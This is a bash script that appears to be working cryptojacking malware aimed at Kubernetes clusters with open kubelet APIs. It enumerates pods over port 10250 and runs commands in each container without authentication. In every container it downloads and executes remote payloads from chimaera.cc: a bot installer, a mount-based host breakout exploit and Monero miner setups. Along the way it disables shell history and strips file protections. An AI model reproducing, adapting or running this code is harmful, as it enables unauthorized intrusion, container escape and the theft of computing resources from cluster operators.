#!/bin/bash
clear
export LC_ALL=C.UTF-8
export LANG=C.UTF-8
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
P1L="http://chimaera.cc/sh/Kubernetes.put.the.bot.sh"		    # first touch payload
P2L="http://chimaera.cc/sh/MountSshExploit.sh"				# mount & breakout payload
P3L="http://chimaera.cc/sh/mo.sh"		                        # setup root pod miner
P4L="http://chimaera.cc/sh/Kubernetes.XMR.tmp.Setup.sh"	    	# setup temporär pod miner
P5L="http://chimaera.cc/sh/Kubernetes.put.the.bot.sh"	    	# install just the bot payload
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
T1F="/tmp/"$RANDOM$RANDOM$RANDOM
T2F="/tmp/"$RANDOM$RANDOM
T1O="10"
T2O="30"
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}"
export HISTFILE=/dev/null 
HISTSIZE=0
unset HISTFILE





function SETUP_SOME_APPS(){
KT=$1 ; NS=$2 ; PN=$3 ; CN=$4
curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apk update" 2>/dev/null 1>/dev/null
curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apt-get update --fix-missing" 2>/dev/null 1>/dev/null
curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="yum clean all" 2>/dev/null 1>/dev/null
curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apk add bash curl wget" 2>/dev/null 1>/dev/null
curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apt-get install -y bash curl wget" 2>/dev/null 1>/dev/null
curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="yum install -y bash curl wget" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mkdir /tmp/" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="chmod 1777 /tmp/" 2>/dev/null 1>/dev/null
}

function setup_packs(){
KT=$1
NS=$2
PN=$3
CN=$4
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apt-get update --fix-missing" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apt-get install -y bash wget curl" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apt-get install -y --reinstall bash wget curl" 2>/dev/null 1>/dev/null
	curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="yum clean all" 2>/dev/null 1>/dev/null
	curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="yum install -y bash wget curl" 2>/dev/null 1>/dev/null
	curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="yum reinstall -y bash wget curl" 2>/dev/null 1>/dev/null
		curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apk update" 2>/dev/null 1>/dev/null
		curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="apk add bash wget curl" 2>/dev/null 1>/dev/null
}

function setup_tmp(){
KT=$1
NS=$2
PN=$3
CN=$4
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o rw,remount /" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q "$P4L"" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o remount,exec /" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="sh Kubernetes.XMR.tmp.Setup.sh" 2>/dev/null 1>/dev/null

}

function setup_root(){
KT=$1
NS=$2
PN=$3
CN=$4
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o rw,remount /" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q "$P3L" -O /tmp/..sr" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o remount,exec /" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash Kubernetes.ROOT.Setup.sh" 2>/dev/null 1>/dev/null
}


function setup_just_the_bot(){
KT=$1
NS=$2
PN=$3
CN=$4
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o rw,remount /" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q "$P5L"" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o remount,exec /" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="sh Kubernetes.put.the.bot.sh" 2>/dev/null 1>/dev/null
}

function setup_mount_sploit(){
KT=$1
NS=$2
PN=$3
CN=$4
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o rw,remount /" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q "$P2L" -O /tmp/..sr" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o remount,exec /" 2>/dev/null 1>/dev/null
curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="sh MountSshExploit.sh" 2>/dev/null 1>/dev/null
}




KT=$1


	if [ -z "$KT" ]; then
	#echo -e "\n\033[0;33m"
	read -p "Kubernetes IP: " KT
	#echo -e "\033[0m"
	fi
		timeout -s SIGKILL $T2O curl -sLk https://$KT:10250/runningpods/ | jq -r '.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name' > $T1F 2>/dev/null

		while read -r NS PN CN; do
			
			echo -e "\n\033[0;33mSERVERIP:\033[0;32m $KT\033[0m"
			echo -e "\033[0;33mCURL_CMD:\033[0;37m curl -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd=\"whoami\"\033[0m"
			echo -e "\033[0;33mKSHELL__:\033[0;37m kshell $KT $NS $PN $CN\033[0m"

			setup_just_the_bot $KT $NS $PN $CN
			
			IFROOT=$(curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="whoami") 2>/dev/null
				if [[ "$IFROOT" != *"Forbidden"* ]]; then if ( [ "$IFROOT" = "root" ] || [[ "$IFROOT" = *"unknown uid 0"* ]] ); then
				echo -e "\033[0;33mWHO_AM_I: \033[0;32mroot\033[0m"				
				### BOT INSTALLER ###
				setup_root $KT $NS $PN $CN
								

				curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="chattr -R -ia /tmp/" 2>/dev/null 1>/dev/null
				curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o rw,remount /" 2>/dev/null 1>/dev/null
				curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q $P1L" 2>/dev/null 1>/dev/null
				curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q $P4L" 2>/dev/null 1>/dev/null
				curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o remount,exec /" 2>/dev/null 1>/dev/null
				curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash Kubernetes.put.the.bot.sh" 2>/dev/null 1>/dev/null
				curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash Kubernetes.XMR.tmp.Setup.sh" 2>/dev/null 1>/dev/null
				
			#ROOTSYS=$(curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="fdisk -l" | grep ' Linux' | awk '{print $1}') 2>/dev/null
			ROOTSYS=$(curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="fdisk -l" | grep '/dev/' | awk '{print $1}' | grep -v 'Disk') 2>/dev/null			
			if [[ "$ROOTSYS" = *"/dev/"* ]]; then
			setup_mount_sploit $KT $NS $PN $CN
				for ROOTSYS_DEV in ${ROOTSYS[@]}; do
				echo -e "\033[0;33mHOST_SYS: \033[0;32m$ROOTSYS_DEV\033[0m"
				
		
				done
					### auto mount sploit
					curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mkdir -p /tmp/" 2>/dev/null 1>/dev/null
					curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o rw,remount /" 2>/dev/null 1>/dev/null
					curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="chattr -R -ia /tmp/" 2>/dev/null 1>/dev/null
					curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q $P2L" 2>/dev/null 1>/dev/null
					curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q $P3L" 2>/dev/null 1>/dev/null
					curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o remount,exec /" 2>/dev/null 1>/dev/null					
					curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash MountSshExploit.sh" 2>/dev/null 1>/dev/null
					curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash Kubernetes.ROOT.Setup.sh" 2>/dev/null 1>/dev/null
		
			
			else
			echo -e "\033[0;33mHOST_SYS:\033[0;31m Not found!\033[0m"
			curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="chattr -R -ia /tmp/" 2>/dev/null 1>/dev/null
			curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o rw,remount /" 2>/dev/null 1>/dev/null
			curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q $P1L" 2>/dev/null 1>/dev/null
			curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q $P4L" 2>/dev/null 1>/dev/null
			curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o remount,exec /" 2>/dev/null 1>/dev/null
			curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash Kubernetes.put.the.bot.sh" 2>/dev/null 1>/dev/null
			curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash Kubernetes.XMR.tmp.Setup.sh" 2>/dev/null 1>/dev/null

			fi

			
				else
				echo -e "\033[0;33mWHO_AM_I:\033[0;31m $IFROOT\033[0m"
				#echo -e "\e[1;33;41mWHO_AM_I: Not root!\033[0m"
				curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="chattr -R -ia /tmp/" 2>/dev/null 1>/dev/null
				curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o rw,remount /" 2>/dev/null 1>/dev/null
				curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q $P1L" 2>/dev/null 1>/dev/null
				curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="wget -q $P4L" 2>/dev/null 1>/dev/null
				curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="mount -o remount,exec /" 2>/dev/null 1>/dev/null
				curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash Kubernetes.put.the.bot.sh" 2>/dev/null 1>/dev/null
				curl --max-time $T2O --connect-timeout $T2O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="bash Kubernetes.XMR.tmp.Setup.sh" 2>/dev/null 1>/dev/null
			
				fi ; fi
			
			
			ROOTSYS=$(curl --max-time $T1O --connect-timeout $T1O -s -XPOST -k https://$KT:10250/run/$NS/$PN/$CN -d cmd="fdisk -l" | grep 'Linux\|/dev/sda|\/dev/sdb' | awk '{print $1}')


			done < $T1F && rm -f $T1F
		#fi





function menumenumenu(){
KT=$2
NS=$3
PN=$4
CN=$5
if [ -z "$KT" ]; then read -p "Kubernetes IP: " KT ; fi
}

